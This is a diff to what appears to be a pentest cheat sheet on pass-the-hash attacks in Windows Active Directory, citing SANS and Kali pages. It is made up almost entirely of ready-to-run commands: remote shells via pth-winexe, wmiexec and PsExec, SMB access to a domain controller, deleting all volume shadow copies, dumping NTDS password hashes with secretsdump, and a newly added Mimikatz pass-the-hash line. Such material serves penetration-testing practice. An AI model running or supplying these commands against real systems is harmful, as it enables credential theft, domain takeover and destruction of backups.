@@ -50,28 +50,34 @@ Command line shell on CORPSQLSERVER01
 pth-winexe -U corp/user_a%aad3b435b51404eeaad3b435b51404ee:48663e7b299fe3a7047b937804cdc34d –uninstall //corpsqlserver01 cmd.exe
 ```
 
- SMB access to CORPDC01
+SMB access to CORPDC01
 
 ```
 pth-smbclient //CORPDC01/c$ -U corp/user_a%aad3b435b51404eeaad3b435b51404ee:48663e7b299fe3a7047b937804cdc34d
 ```
 
- Run commands using WMI on CORPDC01
+Run commands using WMI on CORPDC01
 
 ```
 wmiexec.py –hashes aad3b435b51404eeaad3b435b51404ee:48663e7b299fe3a7047b937804cdc34d corp/user_a @CORPDC01 “vssadmin delete shadows /all /quiet” > ./NTDSData/rem_shadows.log
 ```
 
- Acquire data from Active Directory \(ntds.dit\)
+Acquire data from Active Directory \(ntds.dit\)
 
 ```
 secretsdump.py -just-dc-ntlm –user-status –outputfile | ./NTDSData/CORP/ntds20170711-13.05 -hashes aad3b435b51404eeaad3b435b51404ee:48663e7b299fe3a7047b937804cdc34d corp/user_a@corpdc01
 ```
 
- Command line shell using psexec on Windows
+Command line shell using psexec on Windows
 
 ```
 PsExec.exe -accepteula \\ corpsqlserver01 -s -u corp\user_a -p aad3b435b51404eeaad3b435b51404ee:48663e7b299fe3a7047b937804cdc34d cmd.exe
+```
+
+Mimikatz
+
+```
+Mimikatz.exe “privilege::debug” “sekurlsa::pth /user:[username] /ntlm:[ntlm hash] /domain:[domainname]” “exit”
 ```
 
 [https://www.sans.org/reading-room/whitepapers/testing/cracking-active-directory-passwords-how-cook-ad-crack-37940](https://www.sans.org/reading-room/whitepapers/testing/cracking-active-directory-passwords-how-cook-ad-crack-37940)
@@ -84,7 +90,7 @@ apt-get install freerdp-x11
 ```
 
 ```
-xfreerdp /u:admin /d:win7 /pth:hash:hash /v:192.168.1.101
+xfreerdp /u:admin /d:domain /pth:hash:hash /v:192.168.1.101
 ```
 
 [https://www.kali.org/penetration-testing/passing-hash-remote-desktop/](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/)
